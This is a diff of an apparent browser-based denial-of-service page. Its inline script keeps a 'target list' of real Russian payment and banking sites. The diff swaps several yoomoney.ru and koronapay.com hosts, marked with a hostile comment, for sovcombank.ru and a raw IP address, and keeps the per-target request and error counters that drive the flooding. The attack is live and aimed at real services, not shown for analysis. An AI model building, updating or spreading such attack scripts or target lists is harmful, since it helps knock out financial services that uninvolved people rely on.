@@ -248,18 +248,9 @@ Click on continue if you have a VPN Enabled, use a proxy, use the Tor browser or
 <script>
         // target list
         var urls = [
-        //Our goals, we will finish off the creatures!
-            'https://3ds-gate.yoomoney.ru',
-            'https://zakupki.yoomoney.ru',
-            'https://jobs.yoomoney.ru',
-            'https://shop.yoomoney.ru',
-            'http://certs.yoomoney.ru',
-            'https://cacerts.yoomoney.ru',
-            'https://ocsp.yoomoney.ru',
-            'http://fl.yoomoney.ru',
-            'https://yoomoney.ru',
-            'https://api.koronapay.com',
-            'https://app.koronapay.com',
+        //new single target
+            'https://sovcombank.ru',
+            'https://78.155.198.123:443',
         ];
         // initialize variables
         var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
